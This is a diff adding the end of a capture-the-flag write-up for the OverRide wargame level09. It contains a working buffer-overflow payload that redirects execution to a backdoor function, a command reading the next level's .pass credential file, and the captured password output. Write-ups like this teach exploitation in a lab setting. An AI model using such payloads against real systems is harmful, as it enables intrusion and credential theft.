@@ -55,3 +55,35 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Spot on, the program segfaults as we want. Now we need to find an address to go to.
 Fortunately there is a `secret_backdoor` function that let us use a shell :)
+
+By finding the right offset and the address of `secret_backdoor()`, we end up with
+this script:
+
+```python
+python -c 'import sys; sys.stdout.write("\xff" * 128 + "o" * 140 + "\xff" * 59 + "\x8c\x48\x55\x55\x55\x55" + 
+"\x00" * 2 + 815 * ";" + "cat /home/users/end/.pass")'
+```
+
+Breakdown:
+- `"\xff" * 128`: Fill the `fgets` of the `get_username()` function
+- `"o" * 140 + "\xff" * 59`: Overflows the `data.message` variable just before
+  reaching the targeted return address.
+- `"\x8c\x48\x55\x55\x55\x55" + "\x00" * 2`: The address of `secret_backdoor()`
+- `815 * ";"`: Filling the buffer of the `fgets` of `set_msg()`
+- `"cat /home/users/end/.pass"`: The command we want for the `secret_backdoor()` `fgets()`
+
+```bash
+level09@OverRide:~$ ./level09 < <(python -c 'import sys; sys.stdout.write("\xff" * 128 + "o" * 140 + "\xff" * 59 + "\x8c\x48\x55\x55\x55\x55" + 
+  
+"\x00" * 2 + 815 * ";" + "cat /home/users/end/.pass")')
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
+>>: >: Msg sent!
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
+```
+
+GG !
